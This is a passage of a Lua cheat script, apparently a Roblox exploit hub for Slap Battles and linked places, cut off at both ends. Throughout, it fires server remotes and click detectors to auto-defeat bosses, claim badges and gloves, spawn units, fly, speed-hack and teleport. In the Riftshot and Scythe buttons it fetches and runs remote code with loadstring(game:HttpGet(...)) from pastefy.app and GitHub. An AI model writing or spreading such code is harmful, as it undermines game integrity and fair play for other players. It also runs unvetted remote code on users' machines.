                    fireclickdetector(v.ClickDetector, 0)
                    fireclickdetector(v.ClickDetector, 1)
                end
            end
        end
    })

    Tab:AddButton({
        Name = "Start Enter",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3258, -68, 823)
            wait(2)

            for _, v in pairs(game.Workspace:GetDescendants()) do
                if v.Name == "ShackLever" and v:FindFirstChild("ClickDetector") then
                    fireclickdetector(v.ClickDetector, 0)
                    fireclickdetector(v.ClickDetector, 1)
                end
            end
        end
    })

-- FIGHT TRASK
Tab:AddToggle({
    Name = "Fight Trask",
    Default = false,
    Callback = function(Value)
        _G.BringTrask = Value

        while _G.BringTrask do
            for _, v in pairs(workspace:GetChildren()) do
                if v.Name == "TrackGloveMissile" then
                    local lantern = game.Players.LocalPlayer.Backpack:FindFirstChild("Lantern")
                        or game.Players.LocalPlayer.Character:FindFirstChild("Lantern")

                    if lantern then
                        lantern.Parent = game.Players.LocalPlayer.Character
                        lantern:Activate()

                        if lantern:FindFirstChild("Network") then
                            lantern.Network:FireServer("Hit", v)
                        end
                    end
                end
            end
            task.wait()
        end
    end
})

-- FIGHT FINAL BOSS
Tab:AddToggle({
    Name = "Fight Boss Final",
    Default = false,
    Callback = function(Value)
        _G.FightBossFinal = Value

        while _G.FightBossFinal do
            for _, v in pairs(workspace:GetChildren()) do
                if v.Name == "GuideNPC" and v:FindFirstChild("HumanoidRootPart") then
                    local lantern = game.Players.LocalPlayer.Backpack:FindFirstChild("Lantern")
                        or game.Players.LocalPlayer.Character:FindFirstChild("Lantern")

                    if lantern then
                        lantern.Parent = game.Players.LocalPlayer.Character
                        lantern:Activate()

                        if lantern:FindFirstChild("Network") then
                            lantern.Network:FireServer("Hit", v.HumanoidRootPart)
                        end
                    end
                end
            end
            task.wait()
        end
    end
})

-- FIGHT REPLICA
Tab:AddToggle({
    Name = "Fight Replica",
    Default = false,
    Callback = function(Value)
        _G.FightReplica = Value

        while _G.FightReplica do
            for _, v in pairs(workspace:GetChildren()) do
                if v.Name == "ReplicaNPC" and v:FindFirstChild("HumanoidRootPart") then
                    local lantern = game.Players.LocalPlayer.Backpack:FindFirstChild("Lantern")
                        or game.Players.LocalPlayer.Character:FindFirstChild("Lantern")

                    if lantern then
                        lantern.Parent = game.Players.LocalPlayer.Character
                        lantern:Activate()

                        if lantern:FindFirstChild("Network") then
                            lantern.Network:FireServer("Hit", v.HumanoidRootPart)
                        end
                    end
                end
            end
            task.wait()
        end
    end
})

-- FIGHT GOLEM
Tab:AddToggle({
    Name = "Fight Golem",
    Default = false,
    Callback = function(Value)
        _G.FightGolem = Value

        while _G.FightGolem do
            -- Standard Golem
            for _, v in pairs(workspace:GetChildren()) do
                if v.Name == "golem" and v:FindFirstChild("Hitbox") then
                    local lantern = game.Players.LocalPlayer.Backpack:FindFirstChild("Lantern")
                        or game.Players.LocalPlayer.Character:FindFirstChild("Lantern")

                    if lantern then
                        lantern.Parent = game.Players.LocalPlayer.Character
                        lantern:Activate()

                        if lantern:FindFirstChild("Network") then
                            lantern.Network:FireServer("Hit", v.Hitbox)
                        end
                    end
                end
            end

            -- Dungeon Golem
            for _, v in pairs(workspace:GetChildren()) do
                if v.Name == "DungeonGolem" and v:FindFirstChild("Cube.001") then
                    local lantern = game.Players.LocalPlayer.Backpack:FindFirstChild("Lantern")
                        or game.Players.LocalPlayer.Character:FindFirstChild("Lantern")

                    if lantern then
                        lantern.Parent = game.Players.LocalPlayer.Character
                        lantern:Activate()

                        if lantern:FindFirstChild("Network") then
                            lantern.Network:FireServer("Hit", v:FindFirstChild("Cube.001"))
                        end
                    end
                end
            end

            task.wait()
        end
    end
})

-- FIGHT POTATO LORD (Single Fire)
Tab:AddButton({
    Name = "Fight Potato",
    Callback = function()
        for _, v in pairs(workspace:GetChildren()) do
            if v.Name == "PotatoLord" and v:FindFirstChild("HumanoidRootPart") then
                local lantern = game.Players.LocalPlayer.Backpack:FindFirstChild("Lantern")
                    or game.Players.LocalPlayer.Character:FindFirstChild("Lantern")

                if lantern then
                    lantern.Parent = game.Players.LocalPlayer.Character
                    lantern:Activate()

                    if lantern:FindFirstChild("Network") then
                        lantern.Network:FireServer("Hit", v.HumanoidRootPart)
                    end
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "Lever Start",
    Callback = function()
        for _, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Gate1Lever" and v:FindFirstChild("ClickDetector") then
                fireclickdetector(v.ClickDetector, 0)
                fireclickdetector(v.ClickDetector, 1)
            end
        end
    end
})

Tab:AddButton({
    Name = "Teleport Safe",
    Callback = function()
        if game.Workspace.VoidPart:FindFirstChild("Safe") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 
                game.Workspace.VoidPart.Safe.CFrame * CFrame.new(0, 25, 0)
        end
    end
})

Tab:AddButton({
    Name = "Teleport Fight Guide",
    Callback = function()
        if game.Workspace.VoidPart:FindFirstChild("Safe") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 
                game.Workspace.VoidPart.Safe.CFrame * CFrame.new(0, -40, 0)
        end
    end
})

Tab:AddTextbox({
    Name = "Speed Fly",
    Default = "Userspeed",
    TextDisappear = false,
    Callback = function(Value)
        _G.SetSpeedFly = tonumber(Value) or 100
    end
})

_G.SetSpeedFly = 100

Tab:AddToggle({
    Name = "Start Fly",
    Default = false,
    Callback = function(Value)
        _G.StartFly = Value

        if not _G.StartFly then
            local character = game.Players.LocalPlayer.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            if hrp and humanoid and hrp:FindFirstChild("VelocityHandler") and hrp:FindFirstChild("GyroHandler") then
                hrp.VelocityHandler:Destroy()
                hrp.GyroHandler:Destroy()
                humanoid.PlatformStand = false
            end
            return
        end

        while _G.StartFly do
            local character = game.Players.LocalPlayer.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            local hrp = character and character:FindFirstChild("HumanoidRootPart")

            if humanoid and hrp then
                local bv = hrp:FindFirstChild("VelocityHandler")
                local bg = hrp:FindFirstChild("GyroHandler")

                if not bv and not bg then
                    bv = Instance.new("BodyVelocity")
                    bg = Instance.new("BodyGyro")

                    bv.Name = "VelocityHandler"
                    bv.Parent = hrp
                    bv.MaxForce = Vector3.new(0, 0, 0)
                    bv.Velocity = Vector3.new(0, 0, 0)

                    bg.Name = "GyroHandler"
                    bg.Parent = hrp
                    bg.MaxTorque = Vector3.new(0, 0, 0)
                    bg.P = 1000
                    bg.D = 50
                else
                    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)

                    humanoid.PlatformStand = true
                    bg.CFrame = workspace.CurrentCamera.CFrame
                    bv.Velocity = Vector3.new()

                    local controlModule = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
                    local moveVector = controlModule:GetMoveVector()

                    if moveVector.X ~= 0 then
                        bv.Velocity = bv.Velocity + workspace.CurrentCamera.CFrame.RightVector * (moveVector.X * _G.SetSpeedFly)
                    end
                    if moveVector.Z ~= 0 then
                        bv.Velocity = bv.Velocity - workspace.CurrentCamera.CFrame.LookVector * (moveVector.Z * _G.SetSpeedFly)
                    end
                end
            end

            task.wait()
        end
    end
})

Tab1:AddToggle({
    Name = "Anti Void",
    Default = false,
    Callback = function(Value)
        game.Workspace.VoidPart.CanCollide = Value
        if Value then
            game.Workspace.VoidPart.Transparency = 0.5
        else
            game.Workspace.VoidPart.Transparency = 1
        end
    end
})

Tab1:AddToggle({
    Name = "Anti Wall",
    Default = false,
    Callback = function(Value)
        _G.AntiWall = Value
        while _G.AntiWall do
            for _, v in pairs(game.Workspace:GetChildren()) do
                if v.Name == "PusherWall" then
                    v.CanCollide = false
                end
            end
            task.wait()
        end
    end
})

Tab2:AddSlider({
    Name = "WalkSpeed",
    Min = 20,
    Max = 1000,
    Default = 20,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "WalkSpeed",
    Callback = function(Value)
        local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = Value
            Walkspeed = Value
        end
    end
})

Tab2:AddTextbox({
    Name = "WalkSpeed",
    Default = "UserSpeed",
    TextDisappear = false,
    Callback = function(Value)
        local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        local numValue = tonumber(Value)
        if humanoid and numValue then
            humanoid.WalkSpeed = numValue
            Walkspeed = numValue
        end
    end
})

Tab2:AddToggle({
    Name = "Walkspeed Set Auto",
    Default = false,
    Callback = function(Value)
        KeepWalkspeed = Value
        while KeepWalkspeed do
            local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.WalkSpeed ~= Walkspeed then
                humanoid.WalkSpeed = Walkspeed
            end
            task.wait()
        end
    end
})

Tab2:AddSlider({
    Name = "JumpPower",
    Min = 50,
    Max = 1000,
    Default = 50,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "JumpPower",
    Callback = function(Value)
        local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.JumpPower = Value
            Jumppower = Value
        end
    end
})

Tab2:AddTextbox({
    Name = "Jumppower",
    Default = "UserPower",
    TextDisappear = false,
    Callback = function(Value)
        local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        local numValue = tonumber(Value)
        if humanoid and numValue then
            humanoid.JumpPower = numValue
            Jumppower = numValue
        end
    end
})

Tab2:AddToggle({
    Name = "Jumppower Set Auto",
    Default = false,
    Callback = function(Value)
        KeepJumppower = Value
        while KeepJumppower do
            local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.JumpPower ~= Jumppower then
                humanoid.JumpPower = Jumppower
            end
            task.wait()
        end
    end
})

Tab2:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 7234087065 then -- barzil
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Fan",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Teleport To Pablo NPC",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(202, 3, 220)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Key",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.QuestStuff.Key.CFrame
        end
    })

    Tab:AddButton({
        Name = "Turn Into Clown",
        Callback = function()
            game:GetService("ReplicatedStorage").RemoteEvents.SuitUpClown:FireServer()
        end
    })

    Tab:AddButton({
        Name = "Accept Key Quest",
        Callback = function()
            game:GetService("ReplicatedStorage").RemoteEvents.KeyQuest:FireServer()
        end
    })

    Tab:AddButton({
        Name = "Free OOG",
        Callback = function()
            game:GetService("ReplicatedStorage").RemoteEvents.GOHOME:FireServer()
        end
    })

    Tab:AddButton({
        Name = "Claim Fan Glove Badge",
        Callback = function()
            game:GetService("ReplicatedStorage").RemoteEvents.KeyBadgeReward:FireServer()
        end
    })

    local Tab = Window:MakeTab({
        Name = "Boxer",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Teleport To Boxer Glove",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4230, 3505, 268)
        end
    })

    Tab:AddButton({
        Name = "Click On Boxer Glove",
        Callback = function()
            fireclickdetector(workspace.BoxingGloves.ClickDetector)
        end
    })

    local Tab = Window:MakeTab({
        Name = "Clock",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Auto Teleport To Clock Point (cant stop)",
        Callback = function()
if not game.IsLoaded then
game.Loaded:Wait()
end

-- Credits, message is not squished up cuz it looks bad
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Credits to Nexer1234_AnotherAlt",
	Text = "Made by @nexer1234 ( youtube & discord )",
        Icon = "rbxassetid://125704683916878",
	Duration = 36000,
	Button1 = "Thanks!"
})

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Message from Nexer1234_AnotherAlt",
	Text = "Please re-execute script after teleporting",
    Icon = "rbxassetid://125704683916878",
	Duration = 36000,
	Button1 = "Oh..."
})


if game.PlaceId == 102908326578005 then

-- Sorry, at the moment i was lazy to search for click detectors
for i,v in ipairs(workspace:GetDescendants()) do
if v.ClassName == "ClickDetector" then
fireclickdetector(v)
end
end
wait(2)
for i,v in ipairs(workspace:GetDescendants()) do
if v.ClassName == "ClickDetector" then
fireclickdetector(v)
end
end
wait(2)
while task.wait() do game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(26.34327507019043, 4.055271148681641, -1.8455318212509155) end

elseif game.PlaceId == 7234087065 then

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249.473419, 157.87326, -458.792145, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
task.wait(3)
while task.wait() do
for i,v in pairs(workspace.Buildings:GetChildren()) do
if v.Name == "wizard twoer" and v:FindFirstChild("Cone") then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Cone.CFrame * CFrame.new(0,15,0)
end
end
end

elseif game.PlaceId == 11520107397 or game.PlaceId == 9015014224 or game.PlaceId == 6403373529 or game.PlaceId == 124596094333302 then
  
while task.wait() do game:GetService("TeleportService"):Teleport(7234087065) end

else
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Message from Nexer1234_AnotherAlt",
	Text = "Wrong game buddy",
    Icon = "rbxassetid://125704683916878",
	Duration = 36000,
	Button1 = "Oh..."
})
end
        end
    })

    local Tab = Window:MakeTab({
        Name = "Untitled Tag Glove",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Teleport To TOH Place",
        Callback = function()
            if game.PlaceId ~= 115782629143468 then
                game:GetService("TeleportService"):Teleport(115782629143468)
            elseif game.PlaceId == 115782629143468 then
                local player = game.Players.LocalPlayer
                player.Character.HumanoidRootPart.CFrame = CFrame.new(-558, 182, 54)

                local function fireAllProximityPrompts()
                    for _, descendant in ipairs(workspace:GetDescendants()) do
                        if descendant:IsA("ProximityPrompt") then
                            fireproximityprompt(descendant)
                        end
                    end
                end

                fireAllProximityPrompts()
            end

            -- This line is outside the condition — do you want it here?
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1, 189, 36)
        end
    })

    local Tab = Window:MakeTab({
        Name = "Metaverse",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Teleport To Day in The Life of a Small Roblox Developer Place",
        Callback = function()
            local target = game.workspace.Buildings["wizard twoer 2"].Model.Trigger
            if target then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.CFrame
            else
                warn("Target location not found.")
            end
        end
    })

    local Tab = Window:MakeTab({
        Name = "Dave/mortis",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Teleport To Evil Barzil Portal",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace["Evil Barzil"].evilbarzil.portal.CFrame
        end
    })

    local Tab = Window:MakeTab({
        Name = "Riftshot",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Get Riftshot Glove Badge",
        Callback = function()
            loadstring(game:HttpGet("https://pastefy.app/poybNIBq/raw"))()
        end
    })

local Tab = Window:MakeTab({
    Name = "Settings",
    Icon = "rbxassetid://7734053495",
    PremiumOnly = false
})

    Tab:AddButton({
        Name = "Remove All Landmines",
        Callback = function()
            workspace.Landmines:destroy()
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 102908326578005 then -- Clock Place
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Auto Get Clock Glove",
        Callback = function()
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end

            -- Avoid running multiple times
            if getgenv().AutoGetClockExecuted then return end
            getgenv().AutoGetClockExecuted = true

            if game.PlaceId == 102908326578005 then
                -- Fire all ClickDetectors twice with waits
                for _, v in ipairs(workspace:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end

                wait(3)

                for _, v in ipairs(workspace:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end

                wait(3)

                -- Teleport player repeatedly to a position
                while task.wait() do
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 
                        CFrame.new(26.3433, 4.0553, -1.8455)
                end

            elseif game.PlaceId == 7234087065 then
                -- Teleport player repeatedly to a position with rotation
                while task.wait() do
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 
                        CFrame.new(249.4734, 157.8733, -458.7921, 0.7071, 0, -0.7071, 0, 1, 0, 0.7071, 0, 0.7071)
                end

            elseif game.PlaceId == 11520107397 or game.PlaceId == 9015014224 or game.PlaceId == 6403373529 or game.PlaceId == 124596094333302 then
                -- Teleport player to 7234087065 repeatedly
                while task.wait() do
                    game:GetService("TeleportService"):Teleport(7234087065)
                end

            else
                -- Do nothing or add fallback here if needed
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 115782629143468 then -- Tower Of Hell (Slap Battles)
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Auto Get Untitled Tag Glove",
        Callback = function()
            -- Teleport player to the Untitled Tag glove location
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-558, 182, 54)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 74169485398268 then -- Binded Maze
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Bind",
        Callback = function()
            local player = game.Players.LocalPlayer
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                character.HumanoidRootPart.CFrame = CFrame.new(-153, 5, -169)
                wait(0.5)
                if workspace:FindFirstChild("Orb") and workspace.Orb:FindFirstChild("ClickDetector") then
                    fireclickdetector(workspace.Orb.ClickDetector)
                end
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 92516899071319 then -- Dreamscape (Pillow Tower Defense)
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "Click Pillows"
    })

    -- Helper function to safely fire a ClickDetector
    local function tryFireClickDetector(cd)
        if cd and cd:IsA("ClickDetector") then
            fireclickdetector(cd)
        else
            warn("ClickDetector not found or invalid!")
        end
    end

    -- Pillow buttons
    Tab:AddButton({
        Name = "Pillow 1",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[12].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 2",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model["Meshes/pillow1"].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 3",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[6].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 4",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[2].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 5",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[10].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 6",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[9].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 7",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[8].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 8",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[7].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 9",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[11].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 10",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[5].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 11",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[4].ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Pillow 12",
        Callback = function()
            tryFireClickDetector(workspace.map.Model.Model:GetChildren()[3].ClickDetector)
        end
    })

    -- Pillows from workspace.map children
    local pillowIndexes = {108, 90, 58, 140, 84, 164, 78, 77, 42, 85, 60, 157, 114, 46, 103, 99, 39, 115, 95}
    for i, index in ipairs(pillowIndexes) do
        Tab:AddButton({
            Name = "Pillow " .. (12 + i),
            Callback = function()
                tryFireClickDetector(workspace.map:GetChildren()[index].ClickDetector)
            end
        })
    end

    Tab:AddButton({
        Name = "Pillow 32",
        Callback = function()
            tryFireClickDetector(workspace.map["Meshes/pillow1"].ClickDetector)
        end
    })

    -- Section for spawning units
    Section = Tab:AddSection({
        Name = "Spawn Units (Required Money/Level)"
    })

    local function canAfford(amountText)
        local moneyText = game.Players.LocalPlayer.PlayerGui.MainGui.moneyCounter.Text
        local moneyNum = tonumber(moneyText:gsub("[%$,%s]", "")) or 0
        local required = tonumber(amountText:gsub("[%$,%s]", "")) or 0
        return moneyNum >= required
    end

    local function hasRequiredLevel(requiredLevel)
        local levelText = game.Players.LocalPlayer.PlayerGui.MainGui.dreamPower.inside.dreamLevelLabel.Text
        local currentLevel = tonumber(levelText:match("%d+")) or 0
        return currentLevel >= requiredLevel
    end

    Tab:AddButton({
        Name = "Spawn Sleepy Noob",
        Callback = function()
            if hasRequiredLevel(3) and canAfford("$100") then
                game:GetService("ReplicatedStorage").Remotes.SpawnUnit:FireServer("Sleepy Noob")
            else
                warn("Insufficient level or money for Sleepy Noob")
            end
        end
    })

    Tab:AddButton({
        Name = "Spawn Knight Of Dreams",
        Callback = function()
            if hasRequiredLevel(5) and canAfford("$200") then
                game:GetService("ReplicatedStorage").Remotes.SpawnUnit:FireServer("Knight of Dreams")
            else
                warn("Insufficient level or money for Knight Of Dreams")
            end
        end
    })

    Tab:AddButton({
        Name = "Spawn Cloud McCoolio",
        Callback = function()
            if hasRequiredLevel(5) and canAfford("$500") then
                game:GetService("ReplicatedStorage").Remotes.SpawnUnit:FireServer("Cloud McCoolio")
            else
                warn("Insufficient level or money for Cloud McCoolio")
            end
        end
    })

    -- Section for teleportation
    Section = Tab:AddSection({
        Name = "Teleport To A Bad Dream Place"
    })

    Tab:AddButton({
        Name = "Dark Orb",
        Callback = function()
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.CFrame = CFrame.new(68, 5, 126)
            else
                warn("Character or HumanoidRootPart not found.")
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 95706409702231 then -- Jerry Boss Fight
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Jerry",
        Callback = function()
            if workspace:FindFirstChild("Boss") and workspace.Boss:FindFirstChild("Humanoid") then
                workspace.Boss.Humanoid.RigType = Enum.HumanoidRigType.R15
                OrionLib:MakeNotification({
                    Name = "Notice",
                    Content = "After Use, Slap Him Once",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Boss or Humanoid not found.",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        end
    })

    Tab:AddButton({
        Name = "Santa",
        Callback = function()
            local player = game.Players.LocalPlayer
            local char = player.Character or player.CharacterAdded:Wait()
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.CFrame = CFrame.new(-6, 21, -542)
                OrionLib:MakeNotification({
                    Name = "Notice",
                    Content = "Use in new place",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Character or HumanoidRootPart not found.",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 118650724506449 then -- A Bad Dream
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Snowroller",
        Callback = function()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart and workspace.rooms:FindFirstChild("room exit") and workspace.rooms["room exit"]:FindFirstChild("EXIT") then
                rootPart.CFrame = workspace.rooms["room exit"].EXIT.CFrame
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Required parts not found in workspace.",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        end
    })

    Tab:AddLabel("Fun Fact: if you escape then other user also gonna get snowroller glove!")

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 15228348051 then -- Gardens And Ghouls + Farmland Fray
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddSection({ Name = "Other - Scythe" })
    Tab:AddButton({
        Name = "Scythe",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Dusty1234567890/Book/main/Scythe"))()
        end
    })

    Tab:AddSection({ Name = "Druid" })
    Tab:AddSection({ Name = "Spawn Yellow Flower" })

    local function spawnDefence(position)
        local goldText = game.Players.LocalPlayer.PlayerGui.TowerDefenceUI.Gold.Text
        local gold = tonumber(goldText:match("%d+"))

        if gold and gold >= 200 then
            local args = {
                [1] = "PlaceDefence",
                [2] = {
                    ["cf"] = CFrame.new(unpack(position)),
                    ["defencename"] = "Defence2"
                }
            }
            game:GetService("ReplicatedStorage").TowerDefenceAssets.TD_Event:FireServer(unpack(args))
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Not Enough Money",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end

    local spawnPositions = {
        {27, 11, -9},
        {28, 11, -2},
        {28, 11, 3},
        {29, 11, 9},
        {30, 11, 15}
    }

    for i, pos in ipairs(spawnPositions) do
        Tab:AddButton({
            Name = "Spawn " .. i,
            Callback = function()
                spawnDefence(pos)
            end
        })
    end

    -- 🌸 Purple Flower Section
    Tab:AddSection({ Name = "Spawn Purple Flower" })

    local function spawnPurpleDefence(cost, position)
        local goldText = game.Players.LocalPlayer.PlayerGui.TowerDefenceUI.Gold.Text
        local gold = tonumber(goldText:match("%d+"))

        if gold and gold >= cost then
            local args = {
                [1] = "PlaceDefence",
                [2] = {
                    ["cf"] = CFrame.new(unpack(position)),
                    ["defencename"] = "Defence1"
                }
            }
            game:GetService("ReplicatedStorage").TowerDefenceAssets.TD_Event:FireServer(unpack(args))
        else
            OrionLib:MakeNotification({
                Name = "Error",
